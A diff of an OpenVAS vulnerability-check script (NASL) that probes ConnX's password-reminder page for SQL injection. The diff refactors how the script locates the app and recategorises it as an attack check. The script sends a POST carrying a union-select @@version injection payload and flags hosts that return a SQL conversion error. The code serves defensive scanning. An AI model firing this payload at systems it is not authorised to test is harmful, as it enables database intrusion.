@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: ConnX_34388.nasl 4574 2016-11-18 13:36:58Z teissa $
+# $Id: ConnX_34388.nasl 8782 2018-02-13 10:06:23Z ckuersteiner $
 #
 # ConnX 'frmLoginPwdReminderPopup.aspx' SQL Injection Vulnerability
 #
@@ -24,11 +24,13 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
+CPE = "cpe:/a:connx:connx";
+
 if (description)
 {
  script_oid("1.3.6.1.4.1.25623.1.0.100115");
- script_version("$Revision: 4574 $");
- script_tag(name:"last_modification", value:"$Date: 2016-11-18 14:36:58 +0100 (Fri, 18 Nov 2016) $");
+ script_version("$Revision: 8782 $");
+ script_tag(name:"last_modification", value:"$Date: 2018-02-13 11:06:23 +0100 (Tue, 13 Feb 2018) $");
  script_tag(name:"creation_date", value:"2009-04-08 20:52:50 +0200 (Wed, 08 Apr 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
@@ -37,64 +39,62 @@ if (description)
 
  script_name("ConnX 'frmLoginPwdReminderPopup.aspx' SQL Injection Vulnerability");
 
- script_category(ACT_GATHER_INFO);
+ script_tag(name: "solution_type", value: "VendorFix");
+
+ script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("ConnX_detect.nasl");
- script_require_ports("Services/www", 80);
- script_exclude_keys("Settings/disable_cgi_scanning");
- script_tag(name : "summary" , value : "ConnX is prone to an unspecified SQL-injection vulnerability because
- it fails to sufficiently sanitize user-supplied data before using it in a SQL query.");
- script_tag(name : "impact" , value : "Exploiting this issue could allow an attacker to compromise the
- application, access or modify data, or exploit latent vulnerabilities in the underlying database.");
- script_tag(name : "affected" , value : "ConnX 4.0.20080606 is vulnerable; other versions may also be
- affected.");
+ script_mandatory_keys("connx/installed");
 
- script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/34370");
+ script_tag(name: "summary", value: "ConnX is prone to an unspecified SQL-injection vulnerability because it fails
+to sufficiently sanitize user-supplied data before using it in a SQL query.");
+
+ script_tag(name: "impact", value: "Exploiting this issue could allow an attacker to compromise the application,
+access or modify data, or exploit latent vulnerabilities in the underlying database.");
+
+ script_tag(name: "affected", value: "ConnX 4.0.20080606 is vulnerable; other versions may also be affected.");
+
+ script_xref(name: "URL", value: "http://www.securityfocus.com/bid/34370");
 
  script_tag(name:"qod_type", value:"remote_app");
 
  exit(0);
 }
 
+include("host_details.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
-include("version_func.inc");
 
-port = get_http_port(default:80);
+if (!port = get_app_port(cpe: CPE))
+  exit(0);
 
-if(!can_host_asp(port:port))exit(0);
+if (!dir = get_app_location(cpe: CPE, port: port))
+  exit(0);
 
-if(!version = get_kb_item(string("www/", port, "/connx")))exit(0);
-if(!matches = eregmatch(string:version, pattern:"^(.+) under (/.*)$"))exit(0);
+if (dir == "/")
+  dir = "";
 
-dir  = matches[2];
+variables = "__EVENTTARGET=&__EVENTARGUMENT=&ctl00%24hfLoad=&ctl00%24txtFilter=&ctl00%24txtHelpFile=&ctl00%24txtReportsButtonOffset=70&ctl00%24cphMainContent%24txtEmail=++'+union+select+%40%40version%3B--&ctl00%24cphMainContent%24cbSubmit=Submit&ctl00%24txtCurrentFavAdd=&ctl00%24hfFavsTrigger=";
 
-  if(!isnull(dir)) {
+filename = dir + "/frmLoginPwdReminderPopup.aspx";
+host = http_host_name(port: port);
 
-    variables=string("__EVENTTARGET=&__EVENTARGUMENT=&ctl00%24hfLoad=&ctl00%24txtFilter=&ctl00%24txtHelpFile=&ctl00%24txtReportsButtonOffset=70&ctl00%24cphMainContent%24txtEmail=++'+union+select+%40%40version%3B--&ctl00%24cphMainContent%24cbSubmit=Submit&ctl00%24txtCurrentFavAdd=&ctl00%24hfFavsTrigger=");
-    filename = string(dir + "/frmLoginPwdReminderPopup.aspx");
-    host = http_host_name( port:port );
-
-    req = string(
-              "POST ", filename, " HTTP/1.0\r\n",
+req = string( "POST ", filename, " HTTP/1.0\r\n",
               "Referer: ","http://", host, filename, "\r\n",
               "Host: ", host, "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(variables),
               "\r\n\r\n",
-              variables
-           ); 
+              variables ); 
 
-     buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
-     if( buf == NULL )exit(0);
+buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
+if (buf == NULL)
+  exit(0);
 
-     if(egrep(pattern:"Syntax error converting the nvarchar value", string: buf,icase:TRUE))
-       {    
-          security_message(port:port);
-          exit(0);
-       }
-  }
-
+if (egrep(pattern:"Syntax error converting the nvarchar value", string: buf,icase:TRUE)) {    
+  security_message(port:port);
+  exit(0);
+}
 
 exit(99);
